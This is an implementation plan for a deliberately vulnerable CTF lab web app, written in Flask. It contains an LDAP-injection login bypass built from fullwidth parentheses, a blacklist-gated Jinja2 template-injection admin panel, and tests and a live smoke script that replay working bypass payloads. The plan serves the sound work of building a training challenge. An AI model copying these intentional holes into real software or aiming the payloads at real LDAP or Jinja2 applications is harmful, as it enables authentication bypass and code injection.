# Donerup Web App (Plan 1 of 4) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build and containerize the Donerup "Enterprise SSO" Flask web app — the LDAP-injection auth bypass, the Jinja2 SSTI admin panel, and the `legacy-auth-db` rabbit hole — as a self-contained, fully testable Docker stack, with every exploit payload proven against real running code (not just design-time mocks).

**Architecture:** A small Flask app behind two vulnerable surfaces: `/login` (authentication-by-search against LDAP, exploitable via the verified username-field OR-breakout) and `/admin/report-template` (blacklisted `render_template_string`, exploitable via the verified `~`-concat + tab bypasses), gated by an LDAP `memberOf` role check. LDAP access is behind a pluggable connection factory — a `MOCK_SYNC`-backed in-memory backend for local dev/CI (this plan), swappable for a real AD bind once the DC exists (Plan 3). A second container, `legacy-auth-db` (MySQL), is a dead-end rabbit hole with an explicit migration-hint file directing players to the real path.

**Tech Stack:** Python 3.12, Flask, `ldap3` (MOCK_SYNC + SYNC strategies), Jinja2, pytest, Docker / Docker Compose, MySQL 8.0.

**Relationship to other plans:** This plan produces `build/web/` and the `web` + `legacy-auth-db` services in `build/docker-compose.yml`. Plan 2 (`2026-08-24-donerup-network-pivot.md`) adds the `internal-ad` Docker network, host iptables enforcement, and the pivot route. Plan 3 (`2026-08-24-donerup-ad-escalation.md`) provisions the real Windows DC and switches this app's `LDAP_MODE` from `mock` to `real`. Plan 4 (`2026-08-24-donerup-end-to-end.md`) replays the full attack chain end-to-end across all three.

**Source spec:** `$REPO/donerup-htb-insane-design-v2.md` (v3), §4 and §5.

**Paths:** commands below use `$REPO` for this repository's checkout root.
Set it once per shell before following any task, e.g.
`REPO=~/Desktop/htb-box` (this plan was originally executed with
`REPO=/home/kal/Desktop/htb-box`).


---

## File Structure

```
htb-box/
  build/
    docker-compose.yml
    web/
      Dockerfile
      docker-entrypoint.sh
      requirements.txt
      wsgi.py
      CHANGELOG.md
      app/
        __init__.py
        sanitize.py          # weak blacklist + fullwidth-normalize (LDAP injection surface)
        ldap_auth.py          # authentication-by-search filter + role check
        ldap_connection.py    # pluggable connection factory: real (SYNC) vs mock (MOCK_SYNC)
        ssti_blacklist.py     # scoped blacklist over {{ }}/{% %} fragments only
        ssti_render.py        # blacklist-gated render_template_string wrapper
        webapp.py             # Flask app factory: /login, /dashboard, /admin/report-template
      tests/
        __init__.py
        test_sanitize.py
        test_ldap_auth.py
        test_ldap_connection.py
        test_ssti_blacklist.py
        test_ssti_render.py
        test_webapp.py
        integration_smoke.py  # manual script, run against the live docker-compose stack
    legacy-auth-db/
      Dockerfile
      init.sql
```

Each `app/` module has one job: `sanitize.py` never touches LDAP; `ldap_auth.py` never touches Flask; `webapp.py` only wires the two vulnerable modules to routes and never contains payload/bypass logic itself. This keeps every exploit primitive independently testable, matching how it was verified during design (§12 of the spec).

---

### Task 1: Project scaffolding

**Files:**
- Create: `build/web/requirements.txt`
- Create: `build/web/app/__init__.py`
- Create: `build/web/tests/__init__.py`
- Create: `.gitignore`

- [ ] **Step 1: Initialize the repo**

Run from `$REPO`:

```bash
git init
```

- [ ] **Step 2: Create the `.gitignore`**

```
.venv/
__pycache__/
*.pyc
.pytest_cache/
```

- [ ] **Step 3: Create the package skeleton**

```bash
mkdir -p build/web/app build/web/tests build/legacy-auth-db
touch build/web/app/__init__.py build/web/tests/__init__.py
```

- [ ] **Step 4: Write `requirements.txt`**

```
Flask==3.1.3
ldap3==2.9.1
Jinja2==3.1.6
gunicorn==23.0.0
pytest==8.3.4
requests==2.32.3
```

- [ ] **Step 5: Create and activate a virtualenv, install dependencies**

```bash
cd build/web
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Expected: install completes with no errors.

- [ ] **Step 6: Commit**

```bash
cd $REPO
git add .gitignore build/web/requirements.txt build/web/app/__init__.py build/web/tests/__init__.py
git commit -m "chore: scaffold donerup web app project"
```

---

### Task 2: `sanitize()` — weak blacklist + fullwidth normalization

**Files:**
- Create: `build/web/app/sanitize.py`
- Test: `build/web/tests/test_sanitize.py`

- [ ] **Step 1: Write the failing tests**

`build/web/tests/test_sanitize.py`:

```python
from app.sanitize import sanitize


def test_strips_ascii_metacharacters():
    assert sanitize("a(b)c*d\\e") == "abcde"


def test_converts_fullwidth_parens_to_ascii_after_blacklist():
    assert sanitize("（）＊") == "()*"


def test_normalizes_verified_username_payload():
    raw = "administrator）（|（sAMAccountName=administrator"
    expected = "administrator)(|(sAMAccountName=administrator"
    assert sanitize(raw) == expected


def test_normalizes_verified_password_payload():
    assert sanitize("）") == ")"
```

- [ ] **Step 2: Run the tests to verify they fail**

```bash
cd build/web
pytest tests/test_sanitize.py -v
```

Expected: FAIL with `ModuleNotFoundError: No module named 'app.sanitize'`.

- [ ] **Step 3: Write the implementation**

`build/web/app/sanitize.py`:

```python
ASCII_BLACKLIST = ["(", ")", "*", "\\", "\x00"]

FULLWIDTH_MAP = str.maketrans({
    "（": "(",  # FULLWIDTH LEFT PARENTHESIS
    "）": ")",  # FULLWIDTH RIGHT PARENTHESIS
    "＊": "*",  # FULLWIDTH ASTERISK
})


def sanitize(raw: str) -> str:
    cleaned = raw
    for ch in ASCII_BLACKLIST:
        cleaned = cleaned.replace(ch, "")
    return cleaned.translate(FULLWIDTH_MAP)
```

`str.translate()` requires a table built by `str.maketrans(...)` (ordinal-keyed) — a plain string-keyed dict silently does nothing. This is why `FULLWIDTH_MAP` is wrapped in `str.maketrans(...)` here.

- [ ] **Step 4: Run the tests to verify they pass**

```bash
pytest tests/test_sanitize.py -v
```

Expected: 4 passed.

- [ ] **Step 5: Commit**

```bash
cd $REPO
git add build/web/app/sanitize.py build/web/tests/test_sanitize.py
git commit -m "feat: add weak LDAP input sanitizer with fullwidth-bypass"
```

---

### Task 3: LDAP authentication-by-search

**Files:**
- Create: `build/web/app/ldap_auth.py`
- Test: `build/web/tests/test_ldap_auth.py`

- [ ] **Step 1: Write the failing tests**

`build/web/tests/test_ldap_auth.py`:

```python
import pytest
from ldap3 import Server, Connection, MOCK_SYNC

from app.ldap_auth import authenticate, is_privileged
from app.sanitize import sanitize


@pytest.fixture
def ldap_conn():
    server = Server("donerup-mock")
    conn = Connection(
        server,
        user="cn=svc_ldap,dc=donerup,dc=htb",
        password="mock-password",
        client_strategy=MOCK_SYNC,
    )
    # administrator: privileged, excluded from the legacy migration -> no 'info' at all
    conn.strategy.add_entry(
        "cn=administrator,ou=users,dc=donerup,dc=htb",
        {
            "sAMAccountName": "administrator",
            "objectClass": "user",
            "memberOf": "CN=Domain Admins,DC=donerup,DC=htb",
        },
    )
    # jdoe: regular migrated user, 'info' holds the legacy plaintext-equivalent value
    conn.strategy.add_entry(
        "cn=jdoe,ou=users,dc=donerup,dc=htb",
        {
            "sAMAccountName": "jdoe",
            "objectClass": "user",
            "info": "SogukDonerAyran7",
        },
    )
    conn.bind()
    return conn


def test_wrong_username_is_rejected(ldap_conn):
    ok, _ = authenticate(ldap_conn, "nosuchuser", "whatever")
    assert ok is False


def test_correct_password_for_regular_user_succeeds(ldap_conn):
    ok, _ = authenticate(ldap_conn, "jdoe", "SogukDonerAyran7")
    assert ok is True


def test_wrong_password_for_regular_user_fails(ldap_conn):
    ok, _ = authenticate(ldap_conn, "jdoe", "wrongpass")
    assert ok is False


def test_username_field_or_breakout_bypasses_admin_without_info(ldap_conn):
    username = sanitize("administrator）（|（sAMAccountName=administrator")
    password = sanitize("）")
    ok, member_of = authenticate(ldap_conn, username, password)
    assert ok is True
    assert is_privileged(member_of) is True


def test_or_breakout_generalizes_to_other_users_without_real_password(ldap_conn):
    username = sanitize("jdoe）（|（sAMAccountName=jdoe")
    password = sanitize("）")
    ok, _ = authenticate(ldap_conn, username, password)
    assert ok is True


def test_or_breakout_fails_if_inner_branch_is_false(ldap_conn):
    """Necessity check: the injected OR only works because its first branch
    is a true predicate. Swap it for a false one and the bypass must fail —
    proving the OR is load-bearing, not decorative."""
    username = sanitize("administrator）（|（sAMAccountName=nosuchuser")
    password = sanitize("）")
    ok, _ = authenticate(ldap_conn, username, password)
    assert ok is False


def test_password_only_wildcard_works_for_regular_user_but_not_admin(ldap_conn):
    """Side effect of the info-absent-for-privileged-accounts data model:
    a bare presence-wildcard on `info` still bypasses regular users, but
    never admin, since admin has no `info` attribute to match."""
    password = sanitize("＊")

    ok_jdoe, _ = authenticate(ldap_conn, "jdoe", password)
    assert ok_jdoe is True

    ok_admin, _ = authenticate(ldap_conn, "administrator", password)
    assert ok_admin is False
```

- [ ] **Step 2: Run the tests to verify they fail**

```bash
pytest tests/test_ldap_auth.py -v
```

Expected: FAIL with `ModuleNotFoundError: No module named 'app.ldap_auth'`.

- [ ] **Step 3: Write the implementation**

`build/web/app/ldap_auth.py`:

```python
LDAP_BASE_DN = "dc=donerup,dc=htb"
FILTER_TEMPLATE = "(&(sAMAccountName={username})(info={password}))"


def build_filter(username: str, password: str) -> str:
    return FILTER_TEMPLATE.format(username=username, password=password)


def authenticate(conn, username: str, password: str):
    """Authentication-by-search: bind as svc_ldap (conn is already bound),
    search with the filter, and treat a matching entry as success."""
    filt = build_filter(username, password)
    conn.search(LDAP_BASE_DN, filt, attributes=["memberOf", "sAMAccountName"])
    if not conn.entries:
        return False, []
    entry = conn.entries[0]
    member_of = list(entry.memberOf) if "memberOf" in entry else []
    return True, member_of


def is_privileged(member_of) -> bool:
    return any("Domain Admins" in dn for dn in member_of)
```

- [ ] **Step 4: Run the tests to verify they pass**

```bash
pytest tests/test_ldap_auth.py -v
```

Expected: 7 passed.

- [ ] **Step 5: Commit**

```bash
cd $REPO
git add build/web/app/ldap_auth.py build/web/tests/test_ldap_auth.py
git commit -m "feat: add LDAP authentication-by-search with verified OR-breakout coverage"
```

---

### Task 4: SSTI blacklist + gated render

**Files:**
- Create: `build/web/app/ssti_blacklist.py`
- Create: `build/web/app/ssti_render.py`
- Test: `build/web/tests/test_ssti_blacklist.py`
- Test: `build/web/tests/test_ssti_render.py`

- [ ] **Step 1: Write the failing tests**

`build/web/tests/test_ssti_blacklist.py`:

```python
from app.ssti_blacklist import is_blocked


def test_realistic_prose_template_is_not_blocked():
    assert is_blocked("Hello {{name}}, your report is ready.") is False


def test_naive_dunder_class_access_is_blocked():
    assert is_blocked("{{ ''.__class__ }}") is True


def test_token_split_bypass_is_not_blocked():
    assert is_blocked("{{''['_'~'_cla'~'ss_'~'_']}}") is False


def test_tab_bypasses_space_ban_in_set_statement():
    assert is_blocked("{%set\tx=1%}{{x}}") is False


def test_literal_space_inside_expression_is_blocked():
    assert is_blocked("{% set x = 1 %}{{x}}") is True
```

`build/web/tests/test_ssti_render.py`:

```python
import pytest

from app.ssti_render import render_report_template


def test_renders_realistic_prose_template():
    result = render_report_template("Hello {{name}}, your report is ready.", {"name": "Alice"})
    assert result == "Hello Alice, your report is ready."


def test_blocks_naive_payload():
    with pytest.raises(ValueError):
        render_report_template("{{ ''.__class__ }}", {})


def test_token_split_bypass_renders_class_object():
    result = render_report_template("{{''['_'~'_cla'~'ss_'~'_']}}", {})
    assert result == "<class 'str'>"


def test_tab_bypass_renders_set_variable():
    result = render_report_template("{%set\tx=1%}{{x}}", {})
    assert result == "1"
```

- [ ] **Step 2: Run the tests to verify they fail**

```bash
pytest tests/test_ssti_blacklist.py tests/test_ssti_render.py -v
```

Expected: FAIL with `ModuleNotFoundError: No module named 'app.ssti_blacklist'`.

- [ ] **Step 3: Write the implementation**

`build/web/app/ssti_blacklist.py`:

```python
import re

SSTI_BLACKLIST = [
    "__", "class", "mro", "subclasses", "import",
    "os.", "popen", "system", "eval", "exec", " ",
]

# Blacklist applies only inside {{ ... }} / {% ... %} — not the whole
# document. Scanning the whole raw text would block any template that
# contains a normal sentence, since prose needs spaces.
JINJA_EXPR_RE = re.compile(r"\{\{.*?\}\}|\{%.*?%\}", re.DOTALL)


def is_blocked(raw_template: str) -> bool:
    for match in JINJA_EXPR_RE.finditer(raw_template):
        fragment = match.group(0)
        if any(token in fragment for token in SSTI_BLACKLIST):
            return True
    return False
```

`build/web/app/ssti_render.py`:

```python
from jinja2 import Environment

from .ssti_blacklist import is_blocked


def render_report_template(raw_template: str, context: dict) -> str:
    if is_blocked(raw_template):
        raise ValueError("blocked pattern detected")
    env = Environment()
    template = env.from_string(raw_template)
    return template.render(**context)
```

- [ ] **Step 4: Run the tests to verify they pass**

```bash
pytest tests/test_ssti_blacklist.py tests/test_ssti_render.py -v
```

Expected: 9 passed.

- [ ] **Step 5: Commit**

```bash
cd $REPO
git add build/web/app/ssti_blacklist.py build/web/app/ssti_render.py \
        build/web/tests/test_ssti_blacklist.py build/web/tests/test_ssti_render.py
git commit -m "feat: add scoped SSTI blacklist and gated Jinja2 render"
```

---

### Task 5: Pluggable LDAP connection factory (real + mock)

**Files:**
- Create: `build/web/app/ldap_connection.py`
- Test: `build/web/tests/test_ldap_connection.py`

- [ ] **Step 1: Write the failing tests**

`build/web/tests/test_ldap_connection.py`:

```python
import os

from app import ldap_connection


class FakeServer:
    def __init__(self, host):
        self.host = host


class FakeConnection:
    def __init__(self, server, **kwargs):
        self.server = server
        self.kwargs = kwargs


def test_real_ldap_connection_uses_env_config(monkeypatch):
    monkeypatch.setenv("LDAP_SERVER_HOST", "dc01.donerup.htb")
    monkeypatch.setenv("LDAP_BIND_DN", "CN=svc_ldap,OU=Service Accounts,DC=donerup,DC=htb")
    monkeypatch.setenv("LDAP_BIND_PASSWORD", "test-password")
    monkeypatch.setattr(ldap_connection, "Server", FakeServer)
    monkeypatch.setattr(ldap_connection, "Connection", FakeConnection)

    conn = ldap_connection.real_ldap_connection()

    assert conn.server.host == "dc01.donerup.htb"
    assert conn.kwargs["user"] == "CN=svc_ldap,OU=Service Accounts,DC=donerup,DC=htb"
    assert conn.kwargs["password"] == "test-password"
    assert conn.kwargs["auto_bind"] is True


def test_mock_ldap_connection_has_administrator_and_jdoe():
    conn = ldap_connection.mock_ldap_connection()
    conn.search("dc=donerup,dc=htb", "(sAMAccountName=administrator)", attributes=["memberOf"])
    assert len(conn.entries) == 1


def test_get_ldap_connection_factory_defaults_to_real(monkeypatch):
    monkeypatch.delenv("LDAP_MODE", raising=False)
    assert ldap_connection.get_ldap_connection_factory() is ldap_connection.real_ldap_connection


def test_get_ldap_connection_factory_returns_mock_when_configured(monkeypatch):
    monkeypatch.setenv("LDAP_MODE", "mock")
    assert ldap_connection.get_ldap_connection_factory() is ldap_connection.mock_ldap_connection
```

- [ ] **Step 2: Run the tests to verify they fail**

```bash
pytest tests/test_ldap_connection.py -v
```

Expected: FAIL with `ModuleNotFoundError: No module named 'app.ldap_connection'`.

- [ ] **Step 3: Write the implementation**

`build/web/app/ldap_connection.py`:

```python
import os

from ldap3 import Server, Connection, SYNC, MOCK_SYNC


def real_ldap_connection():
    """Bind against the real DC (Plan 3). Reads config at call time so it
    picks up env vars set after import (e.g. by tests or by docker-compose)."""
    server_host = os.environ.get("LDAP_SERVER_HOST", "dc01.donerup.htb")
    bind_dn = os.environ.get(
        "LDAP_BIND_DN", "CN=svc_ldap,OU=Service Accounts,DC=donerup,DC=htb"
    )
    bind_password = os.environ.get("LDAP_BIND_PASSWORD", "")

    server = Server(server_host)
    return Connection(
        server,
        user=bind_dn,
        password=bind_password,
        client_strategy=SYNC,
        auto_bind=True,
    )


def mock_ldap_connection():
    """In-memory LDAP backend for local dev/CI before the real DC (Plan 3)
    exists. Same fixture data used throughout design verification."""
    server = Server("donerup-mock")
    conn = Connection(
        server,
        user="cn=svc_ldap,dc=donerup,dc=htb",
        password="mock-password",
        client_strategy=MOCK_SYNC,
    )
    conn.strategy.add_entry(
        "cn=administrator,ou=users,dc=donerup,dc=htb",
        {
            "sAMAccountName": "administrator",
            "objectClass": "user",
            "memberOf": "CN=Domain Admins,DC=donerup,DC=htb",
        },
    )
    conn.strategy.add_entry(
        "cn=jdoe,ou=users,dc=donerup,dc=htb",
        {
            "sAMAccountName": "jdoe",
            "objectClass": "user",
            "info": "SogukDonerAyran7",
        },
    )
    conn.bind()
    return conn


def get_ldap_connection_factory():
    """LDAP_MODE=mock -> in-memory backend (Plan 1 default). Anything else
    (including unset) -> real DC bind (Plan 3 deployment)."""
    if os.environ.get("LDAP_MODE", "real") == "mock":
        return mock_ldap_connection
    return real_ldap_connection
```

- [ ] **Step 4: Run the tests to verify they pass**

```bash
pytest tests/test_ldap_connection.py -v
```

Expected: 4 passed.

- [ ] **Step 5: Commit**

```bash
cd $REPO
git add build/web/app/ldap_connection.py build/web/tests/test_ldap_connection.py
git commit -m "feat: add pluggable real/mock LDAP connection factory"
```

---

### Task 6: Flask app — `/login` and `/dashboard`

**Files:**
- Create: `build/web/app/webapp.py`
- Test: `build/web/tests/test_webapp.py`

- [ ] **Step 1: Write the failing tests (login/dashboard portion)**

`build/web/tests/test_webapp.py`:

```python
from app.ldap_connection import mock_ldap_connection
from app.webapp import create_app


def make_app():
    return create_app(ldap_connection_factory=mock_ldap_connection)


def test_wrong_login_is_rejected():
    client = make_app().test_client()
    resp = client.post("/login", data={"username": "administrator", "password": "wrong"})
    assert resp.status_code == 401


def test_legit_regular_user_login_succeeds():
    client = make_app().test_client()
    resp = client.post(
        "/login",
        data={"username": "jdoe", "password": "SogukDonerAyran7"},
        follow_redirects=True,
    )
    assert resp.status_code == 200
    assert b"Welcome, jdoe" in resp.data


def test_regular_user_cannot_reach_admin_panel():
    client = make_app().test_client()
    client.post(
        "/login",
        data={"username": "jdoe", "password": "SogukDonerAyran7"},
    )
    resp = client.get("/admin/report-template")
    assert resp.status_code == 403


def test_verified_or_breakout_authenticates_as_administrator_over_http():
    client = make_app().test_client()
    resp = client.post(
        "/login",
        data={
            "username": "administrator）（|（sAMAccountName=administrator",
            "password": "）",
        },
        follow_redirects=True,
    )
    assert resp.status_code == 200
    assert b"Welcome, administrator" in resp.data
```

- [ ] **Step 2: Run the tests to verify they fail**

```bash
pytest tests/test_webapp.py -v
```

Expected: FAIL with `ModuleNotFoundError: No module named 'app.webapp'`.

- [ ] **Step 3: Write the implementation (login/dashboard portion)**

`build/web/app/webapp.py`:

```python
from flask import Flask, request, session, redirect, url_for

from .sanitize import sanitize
from .ldap_auth import authenticate, is_privileged


def create_app(ldap_connection_factory, secret_key="dev-only-not-for-prod"):
    app = Flask(__name__)
    app.config["SECRET_KEY"] = secret_key
    app.config["LDAP_CONNECTION_FACTORY"] = ldap_connection_factory

    @app.route("/login", methods=["GET"])
    def login_form():
        return (
            '<form method="post" action="/login">'
            '<input name="username">'
            '<input name="password" type="password">'
            '<button type="submit">Sign in</button></form>'
        )

    @app.route("/login", methods=["POST"])
    def login():
        raw_username = request.form.get("username", "")
        raw_password = request.form.get("password", "")
        username = sanitize(raw_username)
        password = sanitize(raw_password)

        conn = app.config["LDAP_CONNECTION_FACTORY"]()
        ok, member_of = authenticate(conn, username, password)
        if not ok:
            return "Invalid credentials", 401

        session["username"] = username
        session["is_privileged"] = is_privileged(member_of)
        return redirect(url_for("dashboard"))

    @app.route("/dashboard")
    def dashboard():
        if "username" not in session:
            return redirect(url_for("login_form"))
        return f"Welcome, {session['username']}"

    return app
```

- [ ] **Step 4: Run the tests to verify they pass**

```bash
pytest tests/test_webapp.py -v
```

Expected: 4 passed.

- [ ] **Step 5: Commit**

```bash
cd $REPO
git add build/web/app/webapp.py build/web/tests/test_webapp.py
git commit -m "feat: add Flask login/dashboard wired to LDAP auth-by-search"
```

---

### Task 7: Flask app — `/admin/report-template` (SSTI surface)

**Files:**
- Modify: `build/web/app/webapp.py`
- Modify: `build/web/tests/test_webapp.py`

- [ ] **Step 1: Add the failing tests**

Append to `build/web/tests/test_webapp.py`:

```python
def _login_as_administrator(client):
    return client.post(
        "/login",
        data={
            "username": "administrator）（|（sAMAccountName=administrator",
            "password": "）",
        },
    )


def test_admin_panel_blocks_naive_ssti_payload():
    client = make_app().test_client()
    _login_as_administrator(client)
    resp = client.post("/admin/report-template", data={"template": "{{ ''.__class__ }}"})
    assert resp.status_code == 400


def test_admin_panel_renders_verified_ssti_bypass():
    client = make_app().test_client()
    _login_as_administrator(client)
    resp = client.post(
        "/admin/report-template",
        data={"template": "{{''['_'~'_cla'~'ss_'~'_']}}"},
    )
    assert resp.status_code == 200
    assert b"class 'str'" in resp.data


def test_admin_panel_renders_realistic_prose_template():
    client = make_app().test_client()
    _login_as_administrator(client)
    resp = client.post(
        "/admin/report-template",
        data={"template": "Hello {{name}}, your report is ready."},
    )
    assert resp.status_code == 200
```

- [ ] **Step 2: Run the tests to verify they fail**

```bash
pytest tests/test_webapp.py -v
```

Expected: FAIL — `/admin/report-template` returns 404 (route doesn't exist yet).

- [ ] **Step 3: Add the route**

In `build/web/app/webapp.py`, add the import and the new route inside `create_app`:

```python
from .ssti_render import render_report_template
```

```python
    @app.route("/admin/report-template", methods=["GET", "POST"])
    def report_template():
        if not session.get("is_privileged"):
            return "Forbidden", 403
        if request.method == "GET":
            return (
                '<form method="post"><textarea name="template"></textarea>'
                '<button type="submit">Render</button></form>'
            )
        raw_template = request.form.get("template", "")
        try:
            rendered = render_report_template(raw_template, {})
        except ValueError:
            return "Blocked pattern detected", 400
        return rendered
```

Add this route definition directly above the `return app` line, after `dashboard()`.

- [ ] **Step 4: Run the tests to verify they pass**

```bash
pytest tests/ -v
```

Expected: all tests pass (31 total: 4 + 7 + 9 + 4 + 4 + 3 across Tasks 2–7).

- [ ] **Step 5: Commit**

```bash
cd $REPO
git add build/web/app/webapp.py build/web/tests/test_webapp.py
git commit -m "feat: add role-gated admin report-template SSTI surface"
```

---

### Task 8: Dockerize the web app

**Files:**
- Create: `build/web/wsgi.py`
- Create: `build/web/Dockerfile`
- Create: `build/web/docker-entrypoint.sh`
- Create: `build/web/CHANGELOG.md`

- [ ] **Step 1: Write the WSGI entrypoint**

`build/web/wsgi.py`:

```python
import os

from app.ldap_connection import get_ldap_connection_factory
from app.webapp import create_app

app = create_app(
    ldap_connection_factory=get_ldap_connection_factory(),
    secret_key=os.environ.get("FLASK_SECRET_KEY", "dev-only-not-for-prod"),
)
```

- [ ] **Step 2: Write the migration-hint file (fair rabbit hole signal)**

`build/web/CHANGELOG.md`:

```markdown
# Donerup Auth — Migration Changelog

## Legacy MySQL auth (legacy-auth-db) — DEPRECATED

The old `legacy-auth-db` MySQL-backed authentication service is
deprecated. Authentication was migrated to the corporate LDAP
directory; `legacy-auth-db` is kept online only for a handful of
legacy read-only reports and will be decommissioned next quarter.
Do not rely on it for current credentials — its data is stale test
data from before the migration.

Live user authentication is handled entirely through LDAP, using the
`info` attribute as the legacy plaintext-equivalent credential value
carried over from the old `password_md5` column during the one-time
migration script. Bind configuration lives in this container's
environment (`LDAP_BIND_DN` / `LDAP_BIND_PASSWORD` / `LDAP_SERVER_HOST`).
```

- [ ] **Step 3: Write the entrypoint script (per-instance flag generation)**

`build/web/docker-entrypoint.sh`:

```bash
#!/bin/sh
set -e

if [ ! -f /home/appuser/user.txt ]; then
    python3 -c "import secrets; print(secrets.token_hex(16))" > /home/appuser/user.txt
    chmod 400 /home/appuser/user.txt
fi

exec "$@"
```

- [ ] **Step 4: Write the Dockerfile**

`build/web/Dockerfile`:

```dockerfile
FROM python:3.12-slim

RUN useradd --create-home --shell /usr/sbin/nologin appuser

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY app/ ./app/
COPY wsgi.py .
COPY CHANGELOG.md /home/appuser/CHANGELOG.md
COPY docker-entrypoint.sh /usr/local/bin/docker-entrypoint.sh

RUN chmod +x /usr/local/bin/docker-entrypoint.sh \
    && chown -R appuser:appuser /app /home/appuser

USER appuser

EXPOSE 5000

ENTRYPOINT ["docker-entrypoint.sh"]
CMD ["gunicorn", "--bind", "0.0.0.0:5000", "wsgi:app"]
```

- [ ] **Step 5: Build the image and smoke-test it standalone**

```bash
cd build/web
docker build -t donerup-web:dev .
docker run --rm -d -p 8080:5000 -e LDAP_MODE=mock --name donerup-web-dev donerup-web:dev
sleep 2
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080/login
docker exec donerup-web-dev cat /home/appuser/user.txt
docker stop donerup-web-dev
```

Expected: `200` from curl, and a 32-character hex flag printed from `user.txt`.

- [ ] **Step 6: Commit**

```bash
cd $REPO
git add build/web/wsgi.py build/web/Dockerfile build/web/docker-entrypoint.sh build/web/CHANGELOG.md
git commit -m "feat: containerize the web app with per-instance flag generation"
```

---

### Task 9: `legacy-auth-db` rabbit hole + Compose wiring

**Files:**
- Create: `build/legacy-auth-db/Dockerfile`
- Create: `build/legacy-auth-db/init.sql`
- Create: `build/docker-compose.yml`

- [ ] **Step 1: Write the MySQL init script**

`build/legacy-auth-db/init.sql`:

```sql
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(64) NOT NULL,
    password_md5 CHAR(32) NOT NULL
);

INSERT INTO users (username, password_md5) VALUES
    ('test_user1', MD5('summer2018')),
    ('test_user2', MD5('qwerty123')),
    ('demo', MD5('demo1234'));
```

This data is intentionally disconnected from real AD accounts — cracking it dead-ends, which is the point (spec §5: "if cracked, all that's inside is dummy/invalid records").

- [ ] **Step 2: Write the Dockerfile**

`build/legacy-auth-db/Dockerfile`:

```dockerfile
FROM mysql:8.0
COPY init.sql /docker-entrypoint-initdb.d/init.sql
```

- [ ] **Step 3: Write the Compose file wiring both services**

`build/docker-compose.yml`:

```yaml
services:
  web:
    build: ./web
    ports:
      - "8080:5000"
    environment:
      LDAP_MODE: mock
      FLASK_SECRET_KEY: dev-only-not-for-prod
    networks:
      - dmz

  legacy-auth-db:
    build: ./legacy-auth-db
    environment:
      MYSQL_ROOT_PASSWORD: "DonerciKral99!"
      MYSQL_DATABASE: legacy_auth
    networks:
      - dmz

networks:
  dmz:
    driver: bridge
```

`LDAP_MODE: mock` is this plan's boundary — Plan 3 (Windows DC) replaces it with `LDAP_SERVER_HOST` / `LDAP_BIND_DN` / `LDAP_BIND_PASSWORD` pointing at the real DC and drops `LDAP_MODE` entirely (defaulting `get_ldap_connection_factory()` back to `real_ldap_connection`). Plan 2 adds the `internal-ad` network and the iptables enforcement between it and the AD VLAN — this compose file is the Plan-1-only dev/test stack, not the final topology.

- [ ] **Step 4: Bring up the full stack and confirm both services are healthy**

```bash
cd build
docker compose up -d --build
docker compose ps
```

Expected: both `web` and `legacy-auth-db` show `running`/`healthy`.

- [ ] **Step 5: Confirm the rabbit hole is reachable but isolated from anything real**

```bash
docker compose exec legacy-auth-db mysql -uroot -p'DonerciKral99!' -e "SELECT * FROM legacy_auth.users;"
```

Expected: 3 rows of dummy `username`/`password_md5` data, none of which correspond to any LDAP account used elsewhere in this plan.

- [ ] **Step 6: Commit**

```bash
cd $REPO
git add build/legacy-auth-db/Dockerfile build/legacy-auth-db/init.sql build/docker-compose.yml
git commit -m "feat: add legacy-auth-db rabbit hole and compose wiring"
```

---

### Task 10: End-to-end integration smoke test

**Files:**
- Create: `build/web/tests/integration_smoke.py`

This is a manual script, not part of the default `pytest` run — it needs the live Compose stack up (`docker compose up -d` from Task 9) and replays every verified payload from the spec over real HTTP against the built container, proving the whole chain works outside of Flask's test client too.

- [ ] **Step 1: Write the script**

`build/web/tests/integration_smoke.py`:

```python
import sys

import requests

BASE_URL = "http://localhost:8080"


def check(name, cond):
    status = "PASS" if cond else "FAIL"
    print(f"[{status}] {name}")
    if not cond:
        sys.exit(1)


def main():
    resp = requests.post(
        f"{BASE_URL}/login", data={"username": "administrator", "password": "wrong"}
    )
    check("plain wrong admin login rejected", resp.status_code == 401)

    session = requests.Session()
    resp = session.post(
        f"{BASE_URL}/login",
        data={
            "username": "administrator）（|（sAMAccountName=administrator",
            "password": "）",
        },
    )
    check(
        "verified OR-breakout payload authenticates as administrator over HTTP",
        resp.status_code == 200 and "Welcome, administrator" in resp.text,
    )

    resp = session.get(f"{BASE_URL}/admin/report-template")
    check("administrator can reach admin panel", resp.status_code == 200)

    resp = session.post(
        f"{BASE_URL}/admin/report-template", data={"template": "{{ ''.__class__ }}"}
    )
    check("naive SSTI payload blocked", resp.status_code == 400)

    resp = session.post(
        f"{BASE_URL}/admin/report-template",
        data={"template": "{{''['_'~'_cla'~'ss_'~'_']}}"},
    )
    check(
        "verified SSTI bypass renders class object over HTTP",
        resp.status_code == 200 and "class 'str'" in resp.text,
    )

    print("\nALL INTEGRATION CHECKS PASSED")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Run it against the live stack**

```bash
cd build
docker compose up -d --build
python3 web/tests/integration_smoke.py
```

Expected: every line prints `[PASS]`, ending with `ALL INTEGRATION CHECKS PASSED`.

- [ ] **Step 3: Tear down**

```bash
docker compose down
```

- [ ] **Step 4: Commit**

```bash
cd $REPO
git add build/web/tests/integration_smoke.py
git commit -m "test: add live end-to-end integration smoke test for the web stack"
```

---

## Self-Review

**Spec coverage:**
- §4.1 (LDAP injection, weak `sanitize()`, verified username-field OR-breakout, `info`-absent-for-privileged data model, necessity/generalization/side-effect checks) → Tasks 2, 3.
- §4.2 (Jinja2 SSTI, scoped blacklist, `~`-concat + tab bypasses) → Task 4.
- §4.2 role gate (admin panel requires `Domain Admins` in `memberOf`) → Task 6/7.
- §5 (container foothold, `legacy-auth-db` rabbit hole with dummy data + migration hint, `appuser` low privilege, no in-container privesc) → Tasks 8, 9.
- §10 (`user.txt` in `appuser` home dir after foothold) → Task 8, Step 3.
- §11 open item "LDAP injection needs re-verification against real AD, not mock" and "AD provisioning must never write `info` for administrator" → explicitly out of scope here, owned by Plan 3; flagged in Task 9's compose comment as the Plan 3 handoff point.
